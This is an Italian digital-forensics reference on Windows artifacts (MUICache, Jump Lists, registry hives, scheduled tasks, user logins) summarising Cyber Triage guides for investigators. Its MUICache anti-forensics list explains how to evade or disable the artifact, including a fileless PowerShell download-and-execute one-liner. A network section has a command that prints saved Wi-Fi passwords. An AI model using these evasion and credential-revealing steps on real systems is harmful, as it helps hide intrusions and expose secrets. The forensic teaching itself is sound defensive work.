MUICache elenca, per utente, gli eseguibili che hanno mostrato una finestra grafica, con descrizione e produttore presi dall'intestazione PE; non ha date e non si svuota da sola.

- **Dove (Vista e successivi):** `UsrClass.dat\Local Settings\Software\Microsoft\Windows\Shell\MuiCache` (live: `HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache`). Prima di Vista: `NTUSER.DAT\Software\Microsoft\Windows\ShellNoRoam\MUICache`.
- **Scopo originale:** supporto multilingua (Multilingual User Interface) senza ricompilare le applicazioni.

| Versione | Nome del valore | Dato |
| --- | --- | --- |
| Prima di Windows 8 | Percorso del file | FileDescription del PE (o nome del file) |
| Windows 8 e successivi | Percorso + `.FriendlyAppName` | FileDescription (o nome del file) |
| Windows 8 e successivi | Percorso + `.ApplicationCompany` | CompanyName (valore assente se il PE non lo ha) |

**Cosa dice e cosa no:** dice l'utente della sessione, il percorso completo, la descrizione e il produttore. Non dice l'orario, gli argomenti, l'account con cui il processo girava, né nulla dei programmi senza GUI.

**Come si comporta (test della guida)**

- La voce la scrive `explorer.exe` quando il processo mostra una finestra; se la finestra compare dopo 5 minuti, anche la voce arriva dopo. Ogni nuova finestra provoca un nuovo controllo.
- Nessuna voce per programmi senza GUI, anche se restano in esecuzione a lungo.
- Nessuna voce per gli script (es. Python), anche se mostrano una GUI.
- Se esiste già `.ApplicationCompany`, la voce non viene riscritta anche se `.FriendlyAppName` è stato cancellato.
- Una voce nell'hive di un utente non prova che il processo girasse come quell'utente: solo che la finestra è comparsa nella sua sessione.
- Se manca FileDescription si usa il nome del file (con o senza estensione a seconda che Esplora risorse la mostri).
- Nessun limite di dimensione osservato (10.000 esecuzioni hanno prodotto oltre 20.000 valori) e nessuna pulizia automatica.

**Va cancellata?** No: non migliora le prestazioni, e le voci da sole non indicano un malware. La svuotano i programmi di pulizia come CCleaner.

**Anti-forensics**

- Cancellare voci con regedit, `Remove-ItemProperty` in PowerShell, cleaner o script: la cancellazione di chiavi e valori è rumorosa per gli EDR.
- Disattivarla: non esiste un'impostazione, ma un ACL Deny `SetValue` per Everyone sulla chiave impedisce a Explorer di scrivere (va fatto per ogni utente).
- Eluderla: eseguire da un Alternate Data Stream (nessuna voce, né per il flusso né per il file che lo contiene), usare solo strumenti a riga di comando (es. `IEX (New-Object Net.WebClient).DownloadString(...)`), usare script.

**Strumenti:** NirSoft MUICacheView; Cyber Triage mostra MUICache insieme agli altri artefatti di esecuzione.

*Fonte:* [MUICache: 2026 Guide for IT and Investigators](https://www.cybertriage.com/blog/muicache-2026-guide/), Cyber Triage (Chris Ray), 28 febbraio 2025, aggiornata 23 marzo 2026.

### 1.12 Jump Lists

Le Jump Lists mostrano quali file un utente ha aperto, con quale applicazione, quante volte e quando l'ultima volta, anche per file che oggi non esistono più: sono centrali nei casi di esfiltrazione, ransomware e minaccia interna.

- **Cosa sono:** i menu dei file recenti e frequenti di ogni applicazione, introdotti con Windows 7 (solo famiglia desktop). Si aprono con il clic destro sull'icona nella barra delle applicazioni o nel menu Start, oppure con Win+Alt+numero dell'icona.

| Tipo | Posizione | Formato | Chi la scrive | Dati principali |
| --- | --- | --- | --- | --- |
| Automatic Destinations | `%AppData%\Microsoft\Windows\Recent\AutomaticDestinations\*.automaticDestinations-ms` | Compound File Binary (CFB) | Windows, in automatico | Percorso del file, ultimo accesso, AppID, frequenza |
| Custom Destinations | `%AppData%\Microsoft\Windows\Recent\CustomDestinations\*.customDestinations-ms` | Sequenza di oggetti MS-SHLLINK (LNK) | L'applicazione | Percorso del file, AppID |

**Elementi utili**

- **File di destinazione:** prova che l'utente vi ha acceduto, anche se il file oggi non esiste.
- **AppID:** è il nome del file jump list (un valore simile a un hash) e identifica l'applicazione; di norma è uguale su tutti i computer. Esempio: `1bc392b8e104a00e` = Connessione Desktop remoto (`mstsc.exe`). Esistono elenchi pubblici di AppID. Il valore predefinito deriva dal percorso dell'eseguibile (vedi il calcolatore di Hexacorn), ma un'applicazione può definirne uno diverso.
- **Ultimo accesso:** solo nelle Automatic Destinations.
- **Contatori d'uso:** distinguono l'uso abituale da quello raro, spesso più sospetto.
- **Dettagli LNK:** date di creazione e modifica del file di destinazione, utili quando il file è sparito.

**Quando mancano dati** (da «What Is a Jump List?»)

- L'app non usa le Jump Lists (es. 7-Zip, Notepad++).
- I dati sono stati cancellati.
- L'impostazione «Show recently opened items in Jump Lists on Start or the taskbar» è disattivata: niente dati nuovi, quelli vecchi restano.
- L'app non è registrata per quel tipo di file (es. LibreOffice con file senza estensione o `.exe`).

Disattivare l'impostazione o togliere voci con la «X» svuota il menu visibile, ma secondo la guida la cache può restare recuperabile.

| Applicazione | Cosa compare | Valore investigativo |
| --- | --- | --- |
| Browser (Edge, Chrome, Firefox) | Siti recenti e frequenti, attività (nuova scheda, navigazione privata), schede fissate | Abitudini di navigazione |
| Office e Notepad | Documenti recenti e frequenti | Accesso ai documenti, uso abituale |
| Lettori multimediali (VLC, Spotify…) | Contenuti riprodotti di recente | Indagini su abusi su minori e indagini interne (HR) |
| WinRAR ed Esplora file | Archivi e cartelle aperti | Phishing, esfiltrazione, abitudini |
| Desktop remoto | Host remoti recenti e fissati | Movimento laterale, esfiltrazione, minaccia interna |

**Strumenti:** JLECmd (Eric Zimmerman), Autopsy, Cyber Triage (che le trasforma in artefatti «Data Accessed» e raccoglie anche i file a cui puntano).

*Fonti:* [Jump Lists Forensics 2025](https://www.cybertriage.com/blog/jump-list-forensics-2025/), Cyber Triage (Alex Detmering), 14 gennaio 2025, aggiornata 19 dicembre 2025; [What Is a Jump List?](https://www.cybertriage.com/blog/what-is-a-jump-list/), Cyber Triage (Alex Detmering), 29 gennaio 2025.

### 1.13 Jump List Cache

La jump list cache è l'insieme dei file da cui Windows costruisce i menu delle Jump Lists: percorsi dei file, orari, contatori e applicazioni usate.

- **Dove:** le stesse cartelle della scheda 1.12. In Esplora risorse non ci si arriva navigando, nemmeno mostrando i file nascosti e di sistema: bisogna digitare il percorso nella barra degli indirizzi.
- **Custom Destinations:** file binario fatto di LNK concatenati, uno per voce; il contenuto varia da applicazione ad applicazione.
- **Automatic Destinations:** file CFB, simile a un piccolo file system con storage (cartelle) e stream (file); lo stream `DestList` contiene le informazioni principali, accanto agli stream LNK.

| Dato | Custom | Automatic |
| --- | --- | --- |
| Date di creazione e modifica di jump list, LNK e file di destinazione | Sì | Sì |
| Applicazione (dal nome del file), percorso e dimensione del file di destinazione | Sì | Sì |
| Argomenti delle attività (task) | Sì | Sì |
| Ultimo accesso | No | Sì |
| Contatore di frequenza | No | Sì |
| Stato «fissato» (pinned) | No | Sì |

- **Chi le usa:** tra le app di Windows Esplora file, Notepad e Microsoft Office; tra quelle di terze parti browser, lettori multimediali e app di messaggistica. Tutte le app desktop possono usarle, non tutte lo fanno.

| Strumento | Uso |
| --- | --- |
| JLECmd (Eric Zimmerman) | Parsing dettagliato delle jump list |
| Autopsy | Correlazione con le altre prove del caso, timeline |
| FTK (Exterro) | Estrazione e revisione manuale da immagini disco o sistemi live |
| Cyber Triage | Raccolta automatica, punteggio di sospetto, artefatti «Data Accessed» collegati a utente, sessione e timeline |

Il consiglio degli autori: conoscere bene limiti e funzionamento dello strumento che si usa, più che memorizzare i formati.

*Fonte:* [What Is Jump List Cache?](https://www.cybertriage.com/blog/what-is-jump-list-cache/), Cyber Triage (Alex Detmering), 24 gennaio 2025, aggiornata 19 dicembre 2025.

## 2. Artefatti di registro

Il registro è la fonte più ricca di un sistema Windows: attività degli utenti, configurazione, programmi installati, dispositivi collegati e persistenza. Queste quattro schede ne coprono la struttura, le tracce di rete, il profilo utente e le attività pianificate.

### 2.1 Fondamenti di registry forensics

Il registro è un database gerarchico di configurazione e telemetria distribuito su più file hive: per un'analisi completa servono sia i file sia i loro transaction log.

| Concetto | Significato |
| --- | --- |
| File di registro | File binari in formato REGF, es. `C:\Windows\System32\Config\SOFTWARE` |
| Transaction log | File REGF (es. `SOFTWARE.LOG1`) con le modifiche non ancora consolidate; un hive con modifiche pendenti è «dirty» e va analizzato insieme ai log |
| Hive | Vista logica caricata in memoria, es. `HKLM\SOFTWARE` |
| Chiave e sottochiave | Oggetti simili a cartelle, ognuno con un last write time |
| Valore | Nome, dato e tipo |
| Last write time | Cambia quando si aggiungono, modificano o cancellano valori, o si aggiungono, rinominano o cancellano sottochiavi |

- **Memoria o disco:** in memoria ci sono gli hive di sistema e solo quelli degli utenti connessi (con 10 utenti e 1 solo connesso, c'è un solo NTUSER). Su disco i dati sono divisi tra file principale e transaction log; le modifiche vengono scritte periodicamente o quando l'hive viene scaricato (logoff, spegnimento).
- Su un sistema live, `HKLM\SYSTEM\CurrentControlSet\Control\hivelist` indica dove sono montati gli hive (chiave volatile, esiste solo in memoria).

| Hive | Contenuto | File su disco |
| --- | --- | --- |
| `HKLM\SOFTWARE` | Software installato, impostazioni di sistema | `C:\Windows\System32\Config\SOFTWARE` |
| `HKLM\SYSTEM` | Hardware, control set, servizi | `C:\Windows\System32\Config\SYSTEM` |
| `HKLM\SECURITY` | Policy di sicurezza e di audit | `C:\Windows\System32\Config\SECURITY` |
| `HKLM\SAM` | Account locali e gruppi | `C:\Windows\System32\Config\SAM` |
| `HKU\<SID>` | Impostazioni e attività dell'utente | `C:\Users\<utente>\NTUSER.DAT` |
| `HKU\<SID>_Classes` | Shell e cronologia delle applicazioni dell'utente | `C:\Users\<utente>\AppData\Local\Microsoft\Windows\UsrClass.dat` |
| `User.dat`, `UserClasses.dat` (app MSIX) | Come NTUSER e UsrClass, ma visti solo da quell'app | `%LOCALAPPDATA%\Packages\<pacchetto>\SystemAppData\Helium\` |
| Amcache | Installazioni, driver, file PE | `C:\Windows\AppCompat\Programs\Amcache.hve` |

**Artefatti principali per hive** (i dettagli sono nelle schede indicate)

- **NTUSER.DAT:** UserAssist (1.10), RunMRU (1.9), OpenSaveMRU, OfficeMRU, Shellbags di rete (1.8), TypedPaths, MountPoints2 (2.3).
- **UsrClass.dat:** Shellbags locali (1.8), MUICache (1.11).
- **SYSTEM:** ShimCache (1.2), BAM/DAM (1.3), MountedDevices (lettere di unità e dispositivi), USB e USBSTOR (vendor, prodotto, numero di serie, primo e ultimo collegamento), servizi, fuso orario, nome del computer, ultimo spegnimento, interfacce di rete (2.2).
- **SOFTWARE:** applicazioni installate, NetworkList (2.2), attività pianificate (2.4), ProfileList (associa ogni SID alla cartella del profilo), versione e data di installazione del sistema, Run e RunOnce di sistema.

**Strumenti**

- Memoria: Volatility, MemProcFS.
- Sistema live: cmdlet PowerShell, API di Windows, `reg`, regedit, TotalRegistry.
- File di registro: RegRipper4 (molti plugin e scansione YARA degli hive), Registry Explorer (segnalibri e parser per gli artefatti comuni), RECmd (batch come `Kroll_Batch`, che estrae oltre 100 chiavi di NTUSER.DAT), Plaso (timeline).
- Riferimento: RegSeek, un archivio consultabile di artefatti del registro.

Cyber Triage raggruppa gli artefatti per domanda: esecuzione (RunMRU, UserAssist, BAM/DAM, ShimCache, MUICache), dati acceduti (OpenSaveMRU, file recenti di Office), persistenza (Run e RunOnce, servizi, attività pianificate, nuovi account), movimento laterale (MountPoints2, Terminal Server Client) e configurazione (hostname, schede di rete, data di installazione, versione, audit, fuso orario).

Approfondimenti collegati dalla guida: [cheat sheet 2026](https://www.cybertriage.com/blog/windows-registry-forensics-cheat-sheet-2026/) e [guida agli strumenti 2026](https://www.cybertriage.com/blog/2026-guide-to-registry-forensics-tools/).

*Fonte:* [Windows Registry Forensics 2026](https://www.cybertriage.com/blog/windows-registry-forensics-2026/), Cyber Triage (Macy Werner), 3 luglio 2025, aggiornata 23 marzo 2026.

### 2.2 Evidenze di rete nel registro

Il registro conserva le reti a cui il computer si è collegato (con prima e ultima connessione), la configurazione IP e MAC di ogni interfaccia e le regole del firewall: dati utili per collocare il dispositivo nel tempo e nello spazio.

**Configurazione IP per interfaccia:** `HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{GUID}` (IPv4; per IPv6 la chiave `Tcpip6`). Il GUID dell'interfaccia collega questa chiave alle altre.

| Valore | Significato |
| --- | --- |
| `EnableDHCP` | 1 = DHCP attivo |
| `IPAddress` / `DhcpIPAddress` | Indirizzo statico / assegnato dal DHCP |
| `SubnetMask` / `DhcpSubnetMask` | Maschera statica / DHCP |
| `LeaseObtainedTime`, `LeaseTerminateTime` | Inizio e fine del lease DHCP (epoch Unix) |
| `Lease` | Durata del lease in secondi |
| `NameServer` / `DhcpNameServer` | DNS statico / DHCP |
| `Domain` / `DhcpDomain` | Suffisso DNS statico / DHCP |

- **MAC e nomi:** `HKLM\SYSTEM\ControlSet001\Control\NetworkSetup2\Interfaces\{GUID}\Kernel` con `PermanentAddress` (MAC di fabbrica), `CurrentAddress` (MAC in uso: diverso solo se cambiato a mano), `IfDescr` (descrizione mostrata da ipconfig), `IfAlias` (nome visibile all'utente).
- **Schede installate:** `HKLM\SYSTEM\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\<NNNN>` con `NetCfgInstanceId` (il GUID dell'interfaccia), versione del driver, data di installazione, modello, stato.
- Il control set in uso è indicato dal valore `Current` in `HKLM\SYSTEM\Select`.

**Reti a cui ci si è collegati:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\{GUID}`

| Valore | Significato |
| --- | --- |
| `ProfileName` | Nome della rete (per il Wi-Fi è l'SSID) |
| `Description` | Nome modificabile, di default uguale a `ProfileName` |
| `DateCreated` | Prima connessione |
| `DateLastConnected` | Ultima connessione |
| `Category` | 0 pubblica, 1 privata, 2 dominio |

- Nelle sottochiavi di `...\NetworkList\Signatures\Managed` e `\Unmanaged`: `ProfileGuid` (collega al profilo), suffisso DNS e MAC del gateway predefinito.
- Password Wi-Fi e tipo di sicurezza (sistema live): `netsh wlan show profiles name="*" key=clear`.

**Firewall:** `HKLM\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\` con le sottochiavi `DomainProfile`, `StandardProfile` (reti private), `PublicProfile`, `FirewallRules` e `HyperVRules` (per esempio regole create da WSL). Contengono lo stato per profilo, i log, l'audit e le interfacce escluse: il firewall può essere attivo ma non proteggere un'interfaccia esclusa.

**Altre fonti di rete**

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\`: condivisioni e unità mappate.
- `HKCU\Software\Microsoft\Terminal Server Client\Servers\`: connessioni RDP in uscita, con host e nomi utente.
- Proxy: `Internet Settings` sotto `HKLM\Software\Policies\Microsoft\Windows\CurrentVersion\`, `HKLM\Software\Microsoft\Windows\CurrentVersion\` e `HKCU\Software\Microsoft\Windows\CurrentVersion\`. Un proxy impostato a mano è un indizio frequente di malware o spionaggio.
- Shellbags con percorsi UNC (1.8).

**Usi investigativi:** collocare il dispositivo (SSID noti), costruire la timeline (lease DHCP per legare hostname e IP, prima e ultima connessione a ogni rete), scoprire abusi (proxy manuali, IP o DNS statici insoliti, regole firewall anomale), trovare modifiche fatte dal malware alle impostazioni di rete.

**Strumenti:** Registry Explorer (plugin NetworkSettings, NetworkSetup2, NetworkAdapters, KnownNetworks); RegRipper (plugin `nic2`, `networksetup2`, `macaddr`, `networklist`).

*Fonte:* [How to Find Evidence of Network Windows Registry](https://www.cybertriage.com/blog/how-to-find-evidence-of-network-windows-registry/), Cyber Triage (Chris Ray), 18 aprile 2025, aggiornata 23 marzo 2026.

### 2.3 NTUSER.DAT

NTUSER.DAT è l'hive personale di ogni utente: dice quali programmi ha avviato, quali file e cartelle ha aperto, cosa ha digitato e a quali host si è collegato, sempre attribuito a quell'account.

- **Dove:** `C:\Users\<utente>\NTUSER.DAT`; per gli account di servizio (Local Service, Network Service, account virtuali) `C:\Windows\ServiceProfiles\*\NTUSER.DAT`; per l'account SYSTEM (S-1-5-18) `C:\Windows\System32\config\DEFAULT` (`HKU\.DEFAULT`). Le app MSIX hanno un proprio `User.dat` in `%LOCALAPPDATA%\Packages\<APPID>\SystemAppData\Helium\`.
- **Ciclo di vita:** caricato al logon come `HKEY_USERS\<SID>`, salvato al logoff o allo spegnimento, aggiornato durante la sessione.
- **Perché conta:** attribuzione al singolo utente; abitudini d'uso nel tempo; persistenza nel contesto utente; correlazione con Prefetch, AmCache, SRUM ed event log; distinzione tra azioni dell'utente e processi in background; prova di azioni volontarie (percorsi digitati, file aperti).

| Artefatto | Percorso sotto `NTUSER.DAT\Software\Microsoft\` | Cosa dà |
| --- | --- | --- |
| UserAssist | `Windows\CurrentVersion\Explorer\UserAssist` | Programmi e LNK avviati dalla GUI (1.10) |
| RunMRU | `Windows\CurrentVersion\Explorer\RunMRU` | Ultimi 26 comandi di Esegui (1.9) |
| LastVisitedMRU | `Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU` | Per ogni applicazione, l'ultima cartella usata in una finestra Apri/Salva |
| OpenSaveMRU | `Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU` | Ultimi 20 file per estensione aperti o salvati con Apri/Salva, con percorso completo |
| RecentDocs | `Windows\CurrentVersion\Explorer\RecentDocs` | Ultimi 150 file o cartelle; sottochiavi per estensione con fino a 20 nomi (senza percorso) |
| OfficeMRU | `Office\<versione>\<app>\File MRU` | File aperti con Word, Excel, PowerPoint, con percorso, applicazione e data |
| Shellbags | `Windows\Shell\BagMRU` e `Windows\Shell\Bags` | Qui solo cartelle di rete; il grosso è in UsrClass.dat (1.8) |
| WordWheelQuery | `Windows\CurrentVersion\Explorer\WordWheelQuery` | Ricerche fatte in Esplora risorse, in ordine |
| TypedPaths | `Windows\CurrentVersion\Explorer\TypedPaths` | Ultimi 26 percorsi digitati nella barra di Esplora risorse (`url1` = il più recente) |
| Run e RunOnce | `Windows\CurrentVersion\Run` e `RunOnce` | Programmi avviati al logon (MITRE T1547.001) |
| MountPoints2 | `Windows\CurrentVersion\Explorer\MountPoints2` | USB e condivisioni di rete usate dall'utente |
| Terminal Server Client | `Terminal Server Client\Servers` e `Default` | RDP in uscita: host, nome utente, ordine MRU, ora dell'ultima connessione |
| App installate per utente | `Windows\CurrentVersion\Uninstall` | Installazioni solo per quell'utente, con comando e argomenti |

**Note sugli artefatti**

- **LastVisitedMRU** vede solo le finestre Apri/Salva: non i file passati da riga di comando né il drag and drop. Notepad di Windows e le app MSIX tengono dati propri.
- **OfficeMRU** con Office 365 si trova sotto `User MRU\LiveId_####\File MRU` (account Microsoft) o `User MRU\AD_####\File MRU` (Azure AD).
- **RecentDocs** è legato alla cartella `%AppData%\Microsoft\Windows\Recent`: i `.lnk` che Windows vi crea danno il percorso completo dei file elencati.
- **TypedPaths** salva solo percorsi esistenti e già risolti (es. `shell:Startup` espanso): non è esattamente ciò che l'utente ha digitato.
- **Terminal Server Client:** `Servers` elenca host o IP con un indizio del nome utente, `Default` l'ordine delle connessioni.
- `Start_TrackProgs` = 0 blocca UserAssist, RunMRU e TypedPaths; `Start_TrackDocs` = 0 blocca RecentDocs.

**Due modi di leggerlo**

| Metodo | Pro | Contro | Strumenti |
| --- | --- | --- | --- |
| Chiedere al sistema | Semplice; include i dati non ancora consolidati | Serve un sistema acceso; le API possono essere agganciate (hooking) da un attaccante | API di Windows, PowerShell, `reg`, regedit, TotalReg |
| Parser esterno | Funziona offline e su immagini; non è influenzabile dal sistema | Deve gestire i transaction log; dipende dalla correttezza dello strumento | RegRipper (non gestisce i transaction log; timeline e YARA), Registry Explorer, RECmd e RLA, Autopsy, Cyber Triage |

**Problemi comuni**

- Hive «dirty» (dati pendenti nei transaction log): usare uno strumento che li gestisca, oppure ricostruire l'hive con RLA e rianalizzarlo.
- Codifiche complesse (UserAssist, Shellbags, OpenSavePidlMRU): servono parser dedicati.
- Formati di data diversi (FILETIME, epoch Unix) o date assenti.
- Artefatti mancanti: cancellati, permessi modificati, tracciamento disattivato, oppure scritti negli hive delle app MSIX.

Risorse per scoprire altri artefatti: RegSeek (cercare `hkcu\`), i plugin di RegRipper4 per NTUSER.DAT, il batch `Kroll_Batch` di RECmd.

*Fonte:* [NTUSER.DAT Forensics Analysis 2026](https://www.cybertriage.com/blog/ntuser-dat-forensics-analysis-2026/), Cyber Triage (Chris Ray), 19 giugno 2025, aggiornata 15 luglio 2026.

### 2.4 Scheduled Tasks

Le attività pianificate servono agli attaccanti per persistenza, esecuzione remota ed escalation a SYSTEM; da Windows 8 la definizione autorevole è nel registro, non nei file XML, e la cronologia sta in event log spesso non attivi di default.

**Come funzionano**

- Si gestiscono con `taskschd.msc`, `schtasks.exe`, `at.exe`, i cmdlet PowerShell o le API.
- Ogni definizione ha **trigger** (orario o evento, anche più d'uno), **azioni** (eseguibile o script con argomenti, oppure un COM handler, cioè un CLSID che punta a una DLL; anche più azioni, e lo strumento deve mostrarle tutte) e **principal** (un utente, es. SYSTEM, o un gruppo: in quel caso chi l'ha eseguita si vede solo dagli event log).
- Il servizio Schedule carica le definizioni all'avvio: un'attività che il servizio non conosce non viene eseguita.
- Abusi (MITRE T1053.005): persistenza, mimetismo tra le attività legittime, modifica di attività esistenti aggiungendo azioni, esecuzione remota (atexec, 1.6), escalation a SYSTEM.

**Dove sono definite**

| Windows | Posizione | Formato |
| --- | --- | --- |
| XP | `C:\Windows\Tasks` | File `.job` binari (Task Scheduler 1.0) |
| Vista e 7 | `C:\Windows\System32\Tasks` (più eventuali `.job` di `at.exe` in `C:\Windows\Tasks`) | XML senza estensione (Task Scheduler 2.0) |
| 8 e successivi | Registro (fonte autorevole) + XML sincronizzati in `C:\Windows\System32\Tasks` | Cancellare l'XML non elimina l'attività |

Chiavi di registro (Windows 8 e successivi):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree`: nome dell'attività, GUID (`Id`), `Index`, security descriptor (`SD`). Il gruppo HAFNIUM (malware Tarrask) ha modificato `Index` e `SD` per nascondere attività agli strumenti standard.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}`: trigger, azioni, principal.

**PowerShell Scheduled Jobs:** l'attività (nel registro e come XML in `C:\Windows\System32\Tasks\Microsoft\Windows\PowerShell\ScheduledJobs`) lancia solo `powershell.exe`, che carica il job con `Import-Module PSScheduledJob` e `LoadFromStore(...)`. Cosa viene eseguito davvero sta in `%LOCALAPPDATA%\Microsoft\Windows\PowerShell\ScheduledJobs\<nome>\ScheduledJobDefinition.xml`, negli elementi `InvocationParam_FilePath` e `InvocationParam_ScriptBlock`.

**In memoria:** nel processo `svchost.exe` che ospita il servizio Schedule (argomenti `-s Schedule`, sui sistemi vecchi `-k netsvcs`). Strumenti: TaskHunter.ps1 (proof of concept), i moduli Volatility `autoruns` (XML) e `schtasks` (.job), MemProcFS. Serve nei casi avanzati: attività cancellate, log disattivati, persistenza solo in memoria.

**Cronologia negli event log**

| Log | Evento | Contenuto | Requisito |
| --- | --- | --- | --- |
| Security | 4698, creata | XML completo della definizione | «Audit Other Object Access Events» = Success (spento di default) |
| Security | 4702, aggiornata | XML completo dopo la modifica | Come sopra |
| Security | 4699, cancellata | Poco contenuto, utile per i tempi tra creazione e cancellazione | Come sopra |
| TaskScheduler/Operational | 100, attività avviata | Nome, GUID dell'istanza, utente | Cronologia delle attività attivata (spenta di default) |
| TaskScheduler/Operational | 200, azione avviata | Percorso del programma, senza argomenti né utente | Come sopra |

I 4698 e 4702 permettono di ricostruire attività cancellate (come quelle temporanee di atexec) e di vedere azioni aggiunte da un attaccante. Gli eventi 100 e 200 si collegano tramite nome e GUID dell'istanza.

**Segnali che Cyber Triage considera sospetti o malevoli:** attività create negli ultimi 30 giorni, eseguibili in posizioni insolite, azioni che lanciano file `.lnk`, attività create da atexec, attività nascoste manipolando `Index` o `SD`. Lo strumento raccoglie anche script ed eseguibili a cui le attività puntano.

*Fonte:* [Windows Scheduled Tasks for DFIR Investigations](https://www.cybertriage.com/blog/windows-scheduled-tasks-for-dfir-investigations/), Cyber Triage (Chris Ray; versione originale di Aaron Bacon), 28 febbraio 2024, aggiornata 23 marzo 2026.

## 3. Artefatti utente

Molti attacchi usano credenziali rubate invece del malware. Queste schede rispondono a chi ha usato il sistema, quando e da dove, che cosa ha fatto e dove ha navigato.

### 3.1 Identificazione degli utenti

Il primo passo su un computer nuovo è elencare gli account che lo hanno usato: il loro numero e le loro caratteristiche dicono subito dove guardare.

- **Il quadro (serie Intro to IR Triage):** la domanda «il computer è compromesso?» si divide in attività utente sospetta, programmi malevoli e modifiche di sistema. L'attività utente si divide a sua volta in chi (questa scheda), quando e da dove (3.2), che cosa (3.3).

| Situazione | Cosa controllare |
| --- | --- |
| Un amministratore e un utente | L'account principale: attività in orari strani, accessi da posizioni sospette, malware che gira con il suo nome |
| Diversi account attivi di recente, uno solo principale | Gli altri account: potrebbero essere controllati dall'attaccante e usati via Desktop remoto per muoversi nella rete |
| Decine o centinaia di account attivi | Probabile server Desktop remoto: serve contesto su ruolo e abitudini di ogni utente |

- **Fonti:** il registro è la fonte principale; la guida indica l'hive SAM, che elenca gli account (per i profili, compresi quelli di dominio, vedi anche ProfileList nella scheda 2.1). Gli utenti cancellati spariscono dal SAM: per un elenco storico servono gli event log che li citano e le cartelle in `C:\Users` che non corrispondono ad account attivi.

| Criterio | Cosa cercare |
| --- | --- |
| Numero di utenti | Coerenza con il ruolo del computer; indagare gli account inattesi |
| Nomi | Rispetto della convenzione aziendale (es. `jdoe` o `john.doe`) |
| Diritti di amministratore | Coerenza con le policy: l'attaccante può concedersi privilegi |
| Locale o di dominio | Account locali che imitano la convenzione di dominio |
| Data di creazione | Account recenti, soprattutto se vicini agli indicatori dell'attacco |

In Cyber Triage la tabella utenti mostra questi dati (ricavati da registro ed event log), se l'account è nuovo rispetto all'analisi precedente e su quanti altri host compare; sotto ci sono orari tipici di accesso, processi, programmi eseguiti e provenienze remote. Gli account si marcano come Bad o Suspicious.

*Fonte:* [Intro to IR Triage (Part 3): User Enumeration](https://www.cybertriage.com/blog/training/intro-to-ir-triage-part-3-user-enumeration/), Cyber Triage (Brian Carrier), 19 giugno 2019, aggiornata 19 gennaio 2026.

### 3.2 Login degli utenti

Gli accessi dicono chi è entrato, da dove e quando: servono a trovare gli account compromessi, la finestra temporale dell'attacco e gli altri host coinvolti.

- **Perché:** con credenziali rubate (phishing, dump di password) l'attaccante entra senza malware. Scenari tipici: movimento laterale con credenziali o hash rubati, password comuni su dispositivi gestiti da terzi (es. POS), dipendenti che accedono a dati non autorizzati fuori orario.

| Direzione | Domanda | Dati necessari |
| --- | --- | --- |
| In entrata | Utenti senza motivo di accedere? | Accessi reali contro utenti attesi |
| In entrata | Un utente ha iniziato ad accedere di recente? | Data del primo accesso (log o cartella del profilo) |
| In entrata | Utenti attesi da host inattesi? | Storico degli host di provenienza |
| In entrata | Utenti attesi in orari inattesi? | Profilo storico degli orari |
| In entrata | Brute force? | Sequenze di accessi falliti |
| In entrata | Applicazione di accesso remoto inattesa? | Tipo di applicazione registrato nei log |
| In uscita | Utenti locali verso computer inattesi? | Destinazioni delle connessioni in uscita |
| In uscita | Nome dell'account cambiato nell'accesso remoto? | Account remoto contro account locale |

**Fonti**

- **Sessioni attive:** API di Windows (via PowerShell o WMI) oppure analisi della memoria, che vede anche ciò che un rootkit nasconde.
- **Accessi in entrata:** log Security (riusciti e falliti, locali e remoti; conserva giorni o settimane, a seconda delle policy di audit); log Terminal Services (solo accessi riusciti, locali e in entrata, ma spesso per periodi lunghissimi: la guida cita casi con 8 anni di dati); frammenti di log in memoria.
- **Accessi in uscita:** evento Security 4648 (credenziali esplicite usate per autenticarsi altrove); in NTUSER.DAT la cronologia del client Desktop remoto (host e nomi utente, ciascuno una volta sola, senza sequenza temporale).
- I file che il sistema tiene bloccati si leggono a basso livello, per esempio con The Sleuth Kit (usato da Cyber Triage).

**Difficoltà:** organizzare centinaia o migliaia di eventi e sapere cosa è «normale» (host, utenti e orari abituali). Cyber Triage unisce event log e registro in una tabella degli accessi remoti raggruppata per utente e host, con il paese degli IP esterni e l'applicazione usata, e segnala da solo account nuovi, brute force e cambi di account.

**Caso d'esempio della guida**

1. `jdoe`, utente principale del PC, apre sessioni RDP verso più di 6 computer (HR, vendite) che non dovrebbe usare: account marcato Bad, presunto compromesso.
2. Verso `dc1` usa le credenziali di `domain_admin`, che non dovrebbe avere: si apre l'indagine su `dc1`.
3. Gli accessi in entrata arrivano da endpoint interni e non dalla VPN che `jdoe` usa di solito: si raccolgono anche quegli endpoint.

*Fonte:* [Intro to IR Triage (Part 4): User Logins](https://www.cybertriage.com/blog/training/intro-to-ir-triage-part-4-user-logins/), Cyber Triage (Brian Carrier), 29 luglio 2019, aggiornata 20 gennaio 2026.

### 3.3 Attività degli utenti

Capire cosa ha fatto un utente si riduce a due domande: ha avviato programmi sospetti? Ha usato programmi normali per accedere a risorse sospette?

**Programmi avviati: dove cercare**

- Registro: RunMRU (1.9), MUICache (1.11), UserAssist (1.10), ShimCache (1.2), BAM (1.3, da Windows 10), RecentApps.
- File: Prefetch (1.1), RecentFileCache e AmCache (1.2), Jump Lists (1.12), SRUM (tempo d'uso e consumi per applicazione), Windows Timeline (Windows 10).
- Event log: creazione dei processi, evento 4688 (592 sui sistemi precedenti a Vista), se attivato.

**Risorse accedute: dove cercare**

- Esplora risorse: Shellbags (1.8) e percorsi digitati in Esegui (RunMRU).
- Web: cronologia, download e cookie dei browser (3.5).
- Liste MRU delle singole applicazioni (formati e posizioni variano).

**Come analizzare i programmi avviati**

1. Deduplicare lo stesso programma trovato in più artefatti.
2. Controllarlo con motori antimalware (Reversing Labs, VirusTotal, OPSWAT, PolySwarm).
3. Verificare la firma digitale.
4. Valutare il percorso: `C:\Windows` e `C:\Program Files` sono normali, `Temp` e `AppData` sospetti.
